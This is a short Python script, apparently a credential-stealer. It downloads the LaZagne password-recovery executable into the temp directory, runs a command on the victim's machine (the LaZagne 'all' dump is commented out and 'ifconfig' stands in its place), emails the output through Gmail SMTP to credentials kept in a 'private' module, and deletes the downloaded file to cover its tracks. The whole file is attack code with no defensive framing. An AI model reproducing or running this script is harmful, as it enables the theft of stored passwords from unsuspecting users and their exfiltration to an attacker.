import smtplib,requests,subprocess,os,tempfile,private

def download(url):
    get_response=requests.get(url)
    file_name=url.split(("/"))[-1]
    with open(file_name,"wb") as outfile:
        outfile.write(get_response.content)

def send_email(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com", 587)    #Port 587 for TLS/Port465 for SSL
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

temp_dir=tempfile.gettempdir()
os.chdir(temp_dir)
download("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.2/lazagne.exe")
#result = subprocess.check_output("laZagne.exe all",shell=True)
result = subprocess.check_output("ifconfig",shell=True)
send_email(private.email_address,private.password,result)
os.remove("lazagne.exe")
